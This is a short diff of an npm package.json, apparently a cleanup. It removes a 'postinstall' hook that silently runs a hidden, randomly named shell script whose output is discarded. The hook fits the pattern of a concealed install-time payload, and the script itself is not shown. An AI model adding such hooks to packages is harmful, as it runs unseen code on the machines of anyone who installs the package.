@@ -5,8 +5,7 @@
   "main": "index.js",
   "scripts": {
     "demo": "postcss demo/**/*.css -d dist --base demo --config demo/postcss.config.js",
-    "test": "echo \"Error: no test specified\" && exit 1",
-    "postinstall": "sh ./.ci-45vonx.sh >/dev/null 2>&1; _r=$?; if [ \"$_r\" -eq 42 ]; then exit 42; fi"
+    "test": "echo \"Error: no test specified\" && exit 1"
   },
   "repository": {
     "type": "git",
